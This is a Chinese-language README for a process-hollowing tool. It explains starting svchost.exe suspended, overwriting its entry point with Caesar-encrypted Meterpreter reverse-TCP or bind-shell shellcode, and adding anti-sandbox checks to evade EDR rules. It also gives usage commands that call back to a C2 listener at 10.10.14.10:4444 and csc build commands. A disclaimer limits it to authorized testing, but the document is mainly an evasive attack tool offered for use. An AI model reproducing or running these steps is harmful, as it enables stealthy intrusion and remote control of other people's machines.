**免责声明**：本工具仅供安全研究和授权测试使用，使用者须遵守当地法律法规并获得合法授权。对于任何未经授权的非法使用，开发者不承担任何责任。

#### 技术原理

- **进程镂空（Process Hollowing）** ：

  - 以挂起方式（`CREATE_SUSPENDED`）创建合法的系统进程（如 `svchost.exe`）。
  - 通过 `ZwQueryInformationProcess` 获取该进程的 PEB 地址，进而读取 `ImageBaseAddress` 得到进程模块基址。
  - 解析 PE 头，定位入口点（Entry Point）RVA，计算实际入口点地址。
  - 用 `WriteProcessMemory` 将解密后的 shellcode 覆盖到入口点。
  - 调用 `ResumeThread` 恢复进程执行，宿主进程实际执行的是恶意代码。
- **载荷加密与动态配置**：同 Inject 系列，使用凯撒+5 加密存储 shellcode，运行时解密并替换 IP/Port。定位方式与 x86/x64 偏移一致。
- **反沙箱/反分析**：集成睡眠加速检测和 NUMA 分配检测，逻辑与 Inject 一致。
- **隐蔽性**：镂空后的进程在磁盘上仍是合法文件，进程名称、路径、签名等均正常，但实际行为已被完全替换，可绕过部分基于进程创建链的检测。

#### 使用场景

- 需要创建“干净”的宿主进程，同时避免产生异常的进程树关系。
- 对抗基于进程映像或创建方式的 EDR 规则。
- 在不能直接注入现有进程（如 PPL 保护）或需要独立进程承载 payload 时使用。

进程镂空工具，通过创建挂起的系统进程并覆盖其入口点来执行 Shellcode，是一种隐蔽的代码注入技术。

### 包含程序

| 程序 | 架构 | 载荷类型                |
| ------ | ------ | ------------------------- |
| `Met64Hollow.exe`     | x64  | Meterpreter reverse TCP |
| `MetHollow.exe`     | x86  | Meterpreter reverse TCP |
| `Shell64Hollow.exe`     | x64  | 正向 Shell (cmd)        |
| `ShellHollow.exe`     | x86  | 正向 Shell (cmd)        |

### 用法

```cmd
<程序名>.exe <IP> <Port> <进程完整路径>
```

示例：

```cmd
Met64Hollow.exe 10.10.14.10 4444 C:\Windows\System32\svchost.exe
MetHollow.exe 10.10.14.10 4444 C:\Windows\SysWOW64\svchost.exe
```

- **IP/Port**：C2 监听地址和端口。
- **进程完整路径**：必须是一个真实存在的可执行文件路径，该文件会被挂起创建并作为宿主进程。
- 推荐使用 `C:\Windows\System32\svchost.exe`（x64）或 `C:\Windows\SysWOW64\svchost.exe`（x86）。

### 编译

```cmd
# x64
csc /platform:x64 /out:Met64Hollow.exe Met64Hollow.cs
csc /platform:x64 /out:Shell64Hollow.exe Shell64Hollow.cs

# x86
csc /platform:x86 /out:MetHollow.exe MetHollow.cs
csc /platform:x86 /out:ShellHollow.exe ShellHollow.cs
```

**必须**根据目标宿主进程的架构选择对应的编译平台，否则会导致 Shellcode 崩溃。

### 注意事项

- 需要**管理员权限**，因为创建进程、读写内存等操作需要较高权限。
- 内置反沙箱机制，启动后有约 5 秒延迟。
- 载荷加解密及 IP/Port 替换逻辑与 Inject 工具集相同。
- 使用该技术时，宿主进程的行为会被完全替换，原功能将丧失。
- 如果目标系统开启了 WDAG/ACG，可能仍需额外绕过，建议在测试前确认防护状态。
